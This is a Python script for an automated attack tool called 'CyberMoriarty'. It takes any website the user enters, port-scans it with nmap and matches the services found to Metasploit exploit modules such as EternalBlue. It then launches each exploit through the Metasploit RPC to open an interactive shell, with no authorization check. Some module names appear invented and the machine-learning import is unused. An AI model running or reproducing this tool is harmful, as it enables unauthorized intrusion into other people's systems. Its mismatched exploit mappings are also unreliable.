import socket
import requests
import nmap
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError

class ThreatIntelligence:
    def __init__(self):
        self.malicious_ips = ["1.2.3.4", "5.6.7.8", "9.10.11.12"]

    def is_ip_malicious(self, ip_address):
        return ip_address in self.malicious_ips

class CyberMoriarty:
    def __init__(self):
        self.model = RandomForestClassifier()
        self.vulnerabilities = []
        self.exploit_suggestions = []
        self.attack_log = []
        self.target = None
        self.threat_intelligence = ThreatIntelligence()
        try:
            self.msfrpc_client = MsfRpcClient('CyberMoriarty', ssl=False)
            print("Connected to Metasploit RPC server.")
        except MsfRpcError as e:
            print(f"Failed to connect to Metasploit RPC server: {e}")
            self.msfrpc_client = None

    def resolve_ip(self, website):
        try:
            self.target = socket.gethostbyname(website)
            print(f"Real IP address of {website}: {self.target}")
        except socket.gaierror:
            print(f"Error: {website} is not a valid website.")
            self.target = None

    def scan_target(self):
        if not self.target:
            print("Target not set.")
            return
        scanner = nmap.PortScanner()
        print(f"Scanning target {self.target}...")
        try:
            scanner.scan(self.target, arguments="-p1-1024 -T4")
            for host in scanner.all_hosts():
                for proto in scanner[host].all_protocols():
                    lport = scanner[host][proto].keys()
                    for port in lport:
                        print(f"Found {scanner[host][proto][port]['name']} on port {port}")
                        self.vulnerabilities.append({
                            'host': host,
                            'port': port,
                            'name': scanner[host][proto][port]['name'],
                            'product': scanner[host][proto][port]['product']
                        })
        except Exception as e:
            print(f"Error scanning target: {e}")

    def suggest_exploits(self):
        common_exploits = {
            'http': 'exploit/unix/webapp/phpmyadmin_pma_password',
            'ssl': 'exploit/multi/http/ssl_slammer',
            'ssh': 'exploit/multi/ssh/sshexec',
            'ftp': 'exploit/unix/ftp/proftpd_modcopy_exec',
            'smtp': 'exploit/unix/smtp/exim4_string_format',
            'smb': 'exploit/windows/smb/ms17_010_eternalblue',
            'rce': 'exploit/windows/smb/ms08_067_netapi',
            'mysql': 'exploit/multi/mysql/mysql_yassl_getname',
            'postgresql': 'exploit/multi/postgres/postgres_payload',
            'vnc': 'exploit/multi/vnc/vnc_keyboard_auth_bypass'
        }

        if self.vulnerabilities:
            print("Suggesting exploits based on vulnerabilities...")
            for vulnerability in self.vulnerabilities:
                service = vulnerability['name']
                if service in common_exploits:
                    print(f"Suggesting exploit for {service} on port {vulnerability['port']}")
                    self.exploit_suggestions.append({
                        'port': vulnerability['port'],
                        'service': service,
                        'version': vulnerability['product'],
                        'exploit': common_exploits[service]
                    })
                else:
                    print(f"No exploit suggestion for {service} on port {vulnerability['port']}")

    def execute_attack(self):
        if not self.msfrpc_client:
            print("Metasploit RPC client not connected.")
            return

        for suggestion in self.exploit_suggestions:
            if suggestion['exploit']:
                try:
                    print(f"Executing exploit {suggestion['exploit']} on port {suggestion['port']}")
                    exploit = self.msfrpc_client.modules.use('exploit', suggestion['exploit'])
                    exploit['RHOSTS'] = self.target
                    exploit['RPORT'] = suggestion['port']
                    exploit['USERNAME'] = 'admin'  # Replace with valid username
                    exploit['PASSWORD'] = 'password'  # Replace with valid password
                    payload = self.msfrpc_client.modules.use('payload', 'cmd/unix/interact')
                    result = exploit.execute(payload=payload)

                    # Checking if the result is a boolean and logging accordingly
                    if isinstance(result, bool):
                        if result:
                            status = 'Attack executed'
                        else:
                            status = 'Attack failed'
                    else:
                        status = 'Unknown response'

                    self.attack_log.append({
                        'port': suggestion['port'],
                        'service': suggestion['service'],
                        'status': status
                    })
                    print(f"{status} on {suggestion['service']}:{suggestion['port']}")
                except Exception as e:
                    print(f"Error executing exploit {suggestion['exploit']}: {str(e)}")
                    self.attack_log.append({
                        'port': suggestion['port'],
                        'service': suggestion['service'],
                        'status': f'Error: {str(e)}'
                    })
            else:
                self.attack_log.append({
                    'port': suggestion['port'],
                    'service': suggestion['service'],
                    'status': 'No known exploit'
                })

    def generate_report(self):
        report = "Cybersecurity Report\n"
        report += "====================\n\n"
        report += "Target: {}\n\n".format(self.target)
        report += "Vulnerabilities:\n"
        for vulnerability in self.vulnerabilities:
            report += "{}:{} - {}\n".format(vulnerability['host'], vulnerability['port'], vulnerability['name'])
        report += "\nExploit Suggestions:\n"
        for suggestion in self.exploit_suggestions:
            report += "{}:{} - {} - Suggested Exploit: {}\n".format(suggestion['port'], suggestion['service'], suggestion['version'], suggestion['exploit'])
        report += "\nAttack Log:\n"
        for log in self.attack_log:
            report += "{}:{} - {}\n".format(log['port'], log['service'], log['status'])
        with open("cybersecurity_report.txt", "w") as f:
            f.write(report)
        print("Cybersecurity report generated: cybersecurity_report.txt")

if __name__ == "__main__":
    tool = CyberMoriarty()
    target_website = input("Enter the target website: ")
    tool.resolve_ip(target_website)
    tool.scan_target()
    tool.suggest_exploits()
    tool.execute_attack()
    tool.generate_report()


